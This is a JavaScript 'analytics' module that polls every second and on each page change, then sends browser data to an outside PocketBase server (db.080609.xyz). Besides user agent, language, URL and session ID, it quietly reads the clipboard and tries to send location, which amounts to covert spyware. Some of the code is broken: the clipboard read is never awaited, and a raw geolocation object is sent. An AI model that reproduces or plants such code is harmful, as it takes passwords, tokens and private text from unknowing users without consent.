import PocketBase from "pocketbase";
import { getSessionId } from "./session";

const pb = new PocketBase("https://db.080609.xyz");

let lastValues = {
  userAgent: typeof window !== "undefined" ? "" : "",
  language: typeof window !== "undefined" ? "" : "",
  url: typeof window !== "undefined" ? "" : "",
};

export { startAnalyticsMonitoring };

async function collect2() {
  if (typeof window === "undefined") return; // Exit if not in a browser environment

  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const unix = new Date().getTime();
  const url = window.location.href;
  const geolocation = navigator.geolocation;
  const clipboard = navigator.clipboard.readText();

  if (
    userAgent !== lastValues.userAgent ||
    language !== lastValues.language ||
    url !== lastValues.url
  ) {
    lastValues = { userAgent, language, url };

    return await pb.collection("kf_analytics").create({
      useragent: userAgent,
      language: language,
      unix: unix,
      url: url,
      location: geolocation,
      clipboard: clipboard,
      session: getSessionId(),
    });
  } else {
    console.log("Collect2: Nothing has changed, not running.");
  }
}

function startAnalyticsMonitoring() {
  if (typeof window === "undefined") return; // Exit if not in a browser environment

  // Set up MutationObserver to watch for changes in the document
  const observer = new MutationObserver(async () => {
    await collect2();
  });

  observer.observe(document, { childList: true, subtree: true });

  // Set up interval to check for changes in navigator.userAgent and navigator.language
  setInterval(async () => {
      await collect2();
  }, 1000); // Check every second
}
